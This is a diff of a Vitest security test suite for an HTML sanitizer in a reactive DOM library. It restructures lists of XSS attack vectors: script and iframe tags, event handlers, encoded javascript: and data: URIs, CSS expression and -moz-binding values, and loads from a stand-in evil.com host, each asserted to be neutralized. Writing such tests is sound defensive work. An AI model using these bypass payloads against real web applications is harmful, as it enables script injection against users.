@@ -1,289 +1,266 @@
 import { afterEach, describe, expect, it } from 'vitest';
 import $ from '@/index';
 
-// ─── Test Harness ────────────────────────────────────────────────────────────
+// ─── Security Test Kit ───────────────────────────────────────────────────────
 
 /**
- * Harness for testing sanitization via the public reactive API surface.
- * Using the public API ensures we validate the security layer as consumers experience it.
+ * Security Testing Harness.
+ * Verifies the sanitization layer via reactive state bindings.
  */
-const aej = {
-  /** Sanitizes HTML by binding it to a temporary element's atomHtml. */
-  async sanitize(html: string | null | undefined): Promise<string> {
-    const atom = $.atom(html as string);
-    const div = $('<div>').atomHtml(atom);
+const TestKit = {
+  async sanitize(html: string): Promise<string> {
+    const val = $.atom(html);
+    const $el = $('<div>').atomHtml(val);
     await $.nextTick();
-    const result = div.html();
-    div.atomUnbind();
+    const result = $el.html();
+    $el.atomUnbind();
     return result;
   },
 
-  /** Validates if a URL attribute binding is blocked. */
-  async isUrlBlocked(attr: string, url: string): Promise<boolean> {
-    const div = $('<a>').atomAttr(attr, $.atom(url));
+  async sanitizeUpdate(initial: string, update: string): Promise<string> {
+    const val = $.atom(initial);
+    const $el = $('<div>').appendTo(document.body).atomHtml(val);
     await $.nextTick();
-    const isBlocked = div.attr(attr) === undefined;
-    div.atomUnbind();
-    return isBlocked;
+    val.value = update;
+    await $.nextTick();
+    const result = $el.html();
+    $el.atomUnbind();
+    $el.remove();
+    return result;
   },
 
-  /** Validates if a CSS property binding is blocked. */
-  async isCssBlocked(prop: string, val: string): Promise<boolean> {
-    const div = $('<div>').atomCss(prop, $.atom(val));
+  async isUrlBlocked(attr: string, url: string): Promise<boolean> {
+    const $el = $('<a>').atomAttr(attr, $.atom(url));
     await $.nextTick();
-    const isBlocked = div[0]!.style.getPropertyValue(prop) === '';
-    div.atomUnbind();
-    return isBlocked;
+    const val = $el.attr(attr);
+    $el.atomUnbind();
+    return val === undefined || val === 'data-unsafe-protocol:';
+  },
+
+  async isCssBlocked(prop: string, val: string): Promise<boolean> {
+    const $el = $('<div>').atomCss(prop, $.atom(val));
+    await $.nextTick();
+    const style = $el[0]!.style.getPropertyValue(prop);
+    $el.atomUnbind();
+    return style === '' || style === 'data-unsafe-css:';
   },
 };
 
-// ─── Test Vectors ────────────────────────────────────────────────────────────
+// ─── Attack Vectors ──────────────────────────────────────────────────────────
 
-const BLACKLISTED_TAGS = [
-  ['<script>alert(1)</script>', 'script'],
-  ['<ScRiPt>alert(1)</ScRiPt>', 'script'],
-  ['<script/src="http://evil.com/x.js"></script>', 'script'],
-  ['<script >alert(1)</script>', 'script'],
-  ['<iframe src="javascript:alert(1)"></iframe>', 'iframe'],
-  ['<object data="javascript:alert(1)"></object>', 'object'],
-  ['<embed src="javascript:alert(1)"></embed>', 'embed'],
-  ['<applet code="XSS.class"></applet>', 'applet'],
-  ['<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', 'meta'],
-  ['<base href="javascript:alert(1)//">', 'base'],
-  ['<link rel="import" href="http://evil.com/xss.html">', 'link'],
-  ['<form action="javascript:alert(1)"></form>', 'form'],
-  ['<isindex action="javascript:alert(1)">', 'isindex'],
-  ['<style>@import "http://evil.com/xss.css";</style>', 'style'],
-  ['<title><img src=x onerror=alert(1)></title>', 'title'],
-  ['<noscript><p title="</noscript><img src=x onerror=alert(1)>">', 'noscript'],
-  ['<body onload=alert(1)>', 'body'],
-];
+const ATTACK_VECTORS = {
+  TAGS: [
+    { payload: '<script>alert(1)</script>', target: 'script', type: 'standard script' },
+    { payload: '<ScRiPt>alert(1)</ScRiPt>', target: 'script', type: 'case-swapped script' },
+    {
+      payload: '<script/src="http://evil.com/x.js"></script>',
+      target: 'script',
+      type: 'malformed opening tag',
+    },
+    {
+      payload: '<iframe src="javascript:alert(1)"></iframe>',
+      target: 'iframe',
+      type: 'active iframe',
+    },
+    {
+      payload: '<object data="javascript:alert(1)"></object>',
+      target: 'object',
+      type: 'malicious object',
+    },
+    {
+      payload: '<embed src="javascript:alert(1)"></embed>',
+      target: 'embed',
+      type: 'malicious embed',
+    },
+    {
+      payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
+      target: 'meta',
+      type: 'meta refresh redirect',
+    },
+    { payload: '<base href="javascript:alert(1)//">', target: 'base', type: 'base url hijack' },
+    {
+      payload: '<link rel="import" href="http://evil.com/xss.html">',
+      target: 'link',
+      type: 'html import',
+    },
+    {
+      payload: '<style>@import "http://evil.com/xss.css";</style>',
+      target: 'style',
+      type: 'css import',
+    },
+    {
+      payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+      target: 'noscript',
+      type: 'noscript breakout',
+    },
+  ],
+  EVENT_HANDLERS: [
+    { payload: '<img src=x onerror=alert(1)>', handler: 'onerror' },
+    { payload: '<div onmouseover="alert(1)">Test</div>', handler: 'onmouseover' },
+    { payload: '<button onclick = "alert(1)">Click</button>', handler: 'onclick' },
+    { payload: '<input onblur\n=\nalert(1)>', handler: 'onblur' },
+    { payload: '<details ontoggle=alert(1)>', handler: 'ontoggle' },
+    { payload: '<video><source onerror=alert(1)>', handler: 'onerror' },
+    { payload: '<svg onload=alert(1)>', handler: 'onload' },
+  ],
+  PROTOCOLS: [
+    { raw: 'javascript:alert(1)', desc: 'standard' },
+    { raw: 'java\0script:alert(1)', desc: 'null-byte injection' },
+    { raw: 'j a v a s c r i p t :alert(1)', desc: 'whitespace bypass' },
+    { raw: 'javascript&colon;alert(1)', desc: 'html entity encoding' },
+    { raw: 'vbscript:msgbox(1)', desc: 'legacy vbscript' },
+    {
+      raw: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+      desc: 'malicious data-uri',
+    },
+  ],
+};
 
-const EVENT_HANDLERS = [
-  ['<img src=x onerror=alert(1)>', 'onerror'],
-  ['<div onmouseover="alert(1)">Test</div>', 'onmouseover'],
-  ['<a onfocus="alert(1)" href="#">Link</a>', 'onfocus'],
-  ['<button onclick = "alert(1)">Click</button>', 'onclick'],
-  ['<input onblur\n=\nalert(1)>', 'onblur'],
-  ['<details ontoggle=alert(1)>', 'ontoggle'],
-  ['<video><source onerror=alert(1)>', 'onerror'],
-  ['<svg onload=alert(1)>', 'onload'],
-  ['<marquee onstart=alert(1)>', 'onstart'],
-];
+// ─── Security Specification ──────────────────────────────────────────────────
 
-const DANGEROUS_PROTOCOLS = [
-  'javascript:alert(1)',
-  'java\0script:alert(1)',
-  'java\x01script:alert(1)',
-  'j a v a s c r i p t :alert(1)',
-  'javascript\n:alert(1)',
-  'javascript\r:alert(1)',
-  'j&#x61;vascript:alert(1)',
-  'j&#97;vascript:alert(1)',
-  'javascript&colon;alert(1)',
-  'javascript&#58;alert(1)',
-  'vbscript:msgbox(1)',
-  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
-  'data:application/javascript;base64,YWxlcnQoMSk=',
-  'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+',
-];
-
-const DANGEROUS_CSS = [
-  'background:url(javascript:alert(1))',
-  'background-image:  url("javascript:alert(1)")',
-  "list-style: url('javascript:alert(1)')",
-  'width:expression(alert(1))',
-  'behavior:url(#default#VML)',
-  '-moz-binding:url(https://evil.com/xbl)',
-  'filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="javascript:alert(1)")',
-  'top:/**/0;background:url(javascript:alert(1))',
-  'color:rgb(0,0,0);background:url(j&#x61;vascript:alert(1))',
-];
-
-// ============================================================================
-// PART 1: Core XSS Protection
-// ============================================================================
-
-describe('Security: Core XSS Protection', () => {
-  describe('Tag & Structure Sanitization', () => {
-    it.each(BLACKLISTED_TAGS)('neutralizes dangerous tag: %s', async (input, tag) => {
-      const result = (await aej.sanitize(input)).toLowerCase();
-      expect(result, `Failed to block <${tag}`).not.toContain(`<${tag}`);
-      expect(result).toContain('<span');
-    });
-
-    it('neutralizes multiple nested dangerous tags', async () => {
-      const payload = '<div><script>alert(1)</script><iframe></iframe><form></form></div>';
-      const result = (await aej.sanitize(payload)).toLowerCase();
-      expect(result).not.toMatch(/<(script|iframe|form)/);
-      expect((result.match(/<span/g) || []).length).toBe(3);
-    });
-  });
-
-  describe('Attribute & Event Handler Sanitization', () => {
-    it.each(EVENT_HANDLERS)('scrubs event handler: %s', async (input, attr) => {
-      const result = (await aej.sanitize(input)).toLowerCase();
-      expect(result).not.toContain(`${attr}=`);
-      expect(result).toContain('data-unsafe-attr=');
-      expect(result).toContain(attr);
-    });
-
-    it('scrubs multiple event handlers on a single element', async () => {
-      const payload = '<div onclick="a()" onmouseover="b()" onmouseenter="c()"></div>';
-      const result = (await aej.sanitize(payload)).toLowerCase();
-      expect(result).not.toMatch(/\bon\w+\s*=/);
-      expect(result).toContain('data-unsafe-attr="onmouseenter,onmouseover,onclick"');
-    });
-  });
-
-  describe('Protocol & URL Sanitization', () => {
-    it.each(DANGEROUS_PROTOCOLS)('blocks dangerous protocol: %s', async (proto) => {
-      const input = `<a href="${proto}">Link</a>`;
-      const result = (await aej.sanitize(input)).toLowerCase();
-      expect(result).not.toContain(proto.replace(/\s+/g, ''));
-      expect(result).toContain('data-unsafe-protocol:');
-    });
-
-    it('blocks protocols in various attributes', async () => {
-      const attrs = ['href', 'src', 'action', 'formaction', 'data', 'poster', 'fill', 'xlink:href'];
-      for (const attr of attrs) {
-        expect(await aej.isUrlBlocked(attr, 'javascript:alert(1)'), `Missed ${attr}`).toBe(true);
-      }
-    });
-
-    it('handles srcset protocol smuggling', async () => {
-      const payload = '<img srcset="image.jpg 1x, javascript:alert(1) 2x">';
-      const result = (await aej.sanitize(payload)).toLowerCase();
-      expect(result).toContain('data-unsafe-protocol:');
-      expect(result).not.toContain('javascript');
-    });
-  });
-
-  describe('CSS & Style Sanitization', () => {
-    it.each(DANGEROUS_CSS)('blocks dangerous CSS: %s', async (css) => {
-      const input = `<div style="${css}">Test</div>`;
-      const result = (await aej.sanitize(input)).toLowerCase();
-      expect(result).not.toContain('javascript');
-      expect(result).not.toContain('expression');
-    });
-
-    it('blocks dangerous CSS via atomCss', async () => {
-      expect(await aej.isCssBlocked('background', 'url(javascript:1)')).toBe(true);
-      expect(await aej.isCssBlocked('width', 'expression(1)')).toBe(true);
-    });
-  });
-});
-
-// ============================================================================
-// PART 2: Advanced Bypass Protection
-// ============================================================================
-
-describe('Security: Advanced Bypass Protection', () => {
-  describe('DOM Clobbering Prevention', () => {
-    it.each([
-      ['id="attributes"', '<form onmouseover=alert(1)><input id="attributes"></form>'],
-      ['name="attributes"', '<form onmouseover=alert(1)><input name="attributes"></form>'],
-      ['id="localName"', '<script id="localName">alert(1)</script>'],
-      ['id="tagName"', '<img onerror=alert(1) id="tagName">'],
-      ['name="nodeName"', '<iframe name="nodeName" src="javascript:alert(1)"></iframe>'],
-      ['id="innerHTML"', '<div id="innerHTML">XSS</div>'],
-      ['id="parentNode"', '<div id="parentNode">XSS</div>'],
-    ])('prevents bypass via clobbered %s', async (_, payload) => {
-      const result = (await aej.sanitize(payload)).toLowerCase();
-      expect(result).not.toMatch(/<(script|iframe)/);
-      expect(result).not.toContain('onerror=');
-      expect(result).not.toContain('onmouseover=');
-    });
-  });
-
-  describe('Recursive & Shadow Contexts', () => {
-    it('sanitizes srcdoc with multiple levels of nesting', async () => {
-      const payload =
-        '<iframe srcdoc="&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;"></iframe>';
-      const result = await aej.sanitize(payload);
-      expect(result).not.toContain('<script');
-      expect(result).not.toContain('&lt;script');
-    });
-
-    it('sanitizes nested <template> fragments', async () => {
-      const payload =
-        '<template><div><template><script>alert(1)</script></template></div></template>';
-      const result = await aej.sanitize(payload);
-      expect(result).not.toContain('<script');
-      expect(result).toContain('<span');
-    });
-
-    it('sanitizes attributes on nodes transformed from executable to safe', async () => {
-      const payload =
-        '<script onerror="alert(1)" src="javascript:alert(2)">console.log(1)</script>';
-      const result = (await aej.sanitize(payload)).toLowerCase();
-      expect(result).not.toContain('onerror=');
-      expect(result).not.toContain('javascript:');
-      expect(result).toContain('data-unsafe-attr="onerror"');
-      expect(result).toContain('data-unsafe-protocol:');
-    });
-  });
-
-  describe('Foreign Contexts (SVG/MathML)', () => {
-    it('sanitizes SVG elements and attributes including animation vectors', async () => {
-      const payloads = [
-        '<svg><a xlink:href="javascript:alert(1)"><rect fill="url(javascript:alert(2))" /></a></svg>',
-        '<svg><set attributeName="onmouseover" to="alert(1)"/></svg>',
-        '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>',
-      ];
-      for (const p of payloads) {
-        const result = (await aej.sanitize(p)).toLowerCase();
-        expect(result).not.toContain('javascript');
-        expect(result).not.toContain('onmouseover');
-        expect(result).not.toContain('onload');
-      }
-    });
-
-    it('sanitizes MathML elements and URI attributes', async () => {
-      const payload = '<math><mi xlink:href="javascript:alert(1)">x</mi></math>';
-      const result = (await aej.sanitize(payload)).toLowerCase();
-      expect(result).not.toContain('javascript');
-    });
-  });
-});
-
-// ============================================================================
-// PART 3: Reactive API Integration
-// ============================================================================
-
-describe('Security: Reactive API Integration', () => {
+describe('Atom-Effect: Security Specification', () => {
   afterEach(() => {
     document.body.innerHTML = '';
   });
 
-  it('atomHtml prevents dynamic updates from introducing XSS', async () => {
-    const val = $.atom('<b>Safe</b>');
-    const div = $('<div>').appendTo(document.body).atomHtml(val);
-    expect(div.html()).toBe('<b>Safe</b>');
+  describe('Structural Isolation: Tag Neutralization', () => {
+    it.each(ATTACK_VECTORS.TAGS)('should neutralize $type tags', async ({ payload, target }) => {
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).not.toContain(`<${target}`);
+      expect(result).toContain('<span');
+    });
 
-    val.value = '<img src=x onerror=alert(1)>';
-    await $.nextTick();
-    expect(div.find('img').attr('onerror')).toBeFalsy();
-    expect(div.html()).toContain('data-unsafe-attr="onerror"');
+    it('should handle deeply nested and recursive malicious tag structures', async () => {
+      const payload = '<div><script>alert(1)</script><iframe><form></form></iframe></div>';
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).not.toMatch(/<(script|iframe|form)/);
+      expect(result).toContain('alert(1)');
+      expect(result).toContain('<span');
+    });
+
+    it('should sanitize content inside inert <template> elements recursively', async () => {
+      const payload = '<template><div><template><script>1</script></template></div></template>';
+      const result = await TestKit.sanitize(payload);
+      expect(result).toContain('<template>');
+      expect(result).not.toContain('<script');
+      expect(result).toContain('<span');
+    });
   });
 
-  it('atomAttr & atomProp guard dangerous sinks in real DOM elements', async () => {
-    const div = $('<div>').appendTo(document.body);
+  describe('Attribute Hardening: Event Handler Scrubbing', () => {
+    it.each(ATTACK_VECTORS.EVENT_HANDLERS)('should strip $handler from elements', async ({
+      payload,
+      handler,
+    }) => {
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).not.toContain(`${handler}=`);
+      expect(result).toContain('data-unsafe-attr=');
+    });
 
-    div.atomAttr('href', $.atom('javascript:alert(1)'));
-    await $.nextTick();
-    expect(div.attr('href')).toBeUndefined();
+    it('should preserve original attribute order when multiple handlers are scrubbed', async () => {
+      const payload = '<div onclick="a()" onmouseover="b()" onmouseenter="c()"></div>';
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).toContain('data-unsafe-attr="onclick,onmouseover,onmouseenter"');
+    });
 
-    // innerHTML is a critical sink blocked by the unified binding system
-    div.atomProp('innerHTML', $.atom('<script>alert(1)</script>'));
-    await $.nextTick();
-    expect(div.html()).toBe('');
+    it('should prevent DOM Clobbering via sensitive attribute names', async () => {
+      const payloads = [
+        '<form><input id="attributes"></form>',
+        '<img id="tagName">',
+        '<iframe name="nodeName"></iframe>',
+      ];
+      for (const p of payloads) {
+        const result = (await TestKit.sanitize(p)).toLowerCase();
+        expect(result).not.toContain('id="attributes"');
+      }
+    });
   });
 
-  it('atomCss guards style properties against protocol smuggling', async () => {
-    const div = $('<div>').appendTo(document.body);
-    div.atomCss('background', $.atom('url(javascript:alert(1))'));
-    await $.nextTick();
-    expect(div[0]!.style.background).toBe('');
+  describe('URI Enforcement: Protocol Security', () => {
+    it.each(ATTACK_VECTORS.PROTOCOLS)('should block $desc protocol bypasses', async ({ raw }) => {
+      const result = (await TestKit.sanitize(`<a href="${raw}"></a>`)).toLowerCase();
+      expect(result).not.toContain(raw.replace(/\s+/g, ''));
+      expect(result).toContain('data-unsafe-protocol:');
+    });
+
+    it('should enforce security on all registered URL-sinks', async () => {
+      const sinks = ['href', 'src', 'action', 'formaction', 'data', 'poster', 'xlink:href'];
+      for (const sink of sinks) {
+        const isBlocked = await TestKit.isUrlBlocked(sink, 'javascript:alert(1)');
+        expect(isBlocked, `URI should be blocked for sink: ${sink}`).toBe(true);
+      }
+    });
+
+    it('Regression: should block double-encoded HTML entity bypass', async () => {
+      const payload = '<a href="&#x26;#x6A;avascript:1"></a>';
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).not.toContain('javascript');
+    });
+  });
+
+  describe('Style Hardening: CSS-based Attack Prevention', () => {
+    it('should strip dangerous CSS patterns while preserving safe declarations', async () => {
+      const payload =
+        '<div style="color: red; background: url(javascript:1); font-size: 12px;"></div>';
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).toContain('color: red');
+      expect(result).toContain('font-size: 12px');
+      expect(result).not.toContain('javascript');
+    });
+
+    it('should detect and block platform-specific dangerous CSS properties', async () => {
+      const patterns = [
+        ['background', 'url(javascript:alert(1))'],
+        ['width', 'expression(alert(1))'],
+        ['-moz-binding', 'url(https://evil.com/xbl)'],
+      ] as const;
+      for (const [prop, val] of patterns) {
+        const isBlocked = await TestKit.isCssBlocked(prop, val);
+        expect(isBlocked, `CSS property "${prop}" should block value: ${val}`).toBe(true);
+      }
+    });
+
+    it('Regression: should prevent attribute injection via quote smuggling in style strings', async () => {
+      const payload = '<div style="font-family: \'url("javascript:alert(1)")\'"></div>';
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).not.toContain('javascript');
+    });
+  });
+
+  describe('Edge Cases & Regression Lab', () => {
+    it('should correctly sanitize foreign XML-based contexts (SVG/MathML)', async () => {
+      const svg = '<svg><a xlink:href="javascript:1"><rect fill="url(javascript:2)" /></a></svg>';
+      const result = (await TestKit.sanitize(svg)).toLowerCase();
+      expect(result).not.toContain('javascript');
+    });
+
+    it('Regression: should neutralize HTML tags hidden within text content', async () => {
+      const payload = '<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>';
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).not.toContain('&lt;script');
+      expect(result).toContain('<span');
+      expect(result).toMatch(/\[script\]/);
+    });
+
+    it('should maintain srcdoc integrity while neutralizing internal scripts', async () => {
+      const payload = '<iframe srcdoc="&lt;b&gt;test&lt;/b&gt; &quot;quote&quot;"></iframe>';
+      const result = await TestKit.sanitize(payload);
+      expect(result).toContain('srcdoc="');
+      expect(result).toContain('&lt;b&gt;test&lt;/b&gt;');
+      expect(result).toContain('&quot;quote&quot;');
+    });
+
+    it('should recursively sanitize srcdoc content', async () => {
+      const payload = '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>';
+      const result = (await TestKit.sanitize(payload)).toLowerCase();
+      expect(result).not.toContain('<script');
+      expect(result).toContain('&lt;span');
+    });
+
+    it('should sanitize dynamic updates via atoms (Reactive Integration)', async () => {
+      const result = await TestKit.sanitizeUpdate('<b>Safe</b>', '<img src=x onerror=alert(1)>');
+      expect(result).not.toContain('onerror=');
+      expect(result).toContain('data-unsafe-attr="onerror"');
+    });
   });
 });
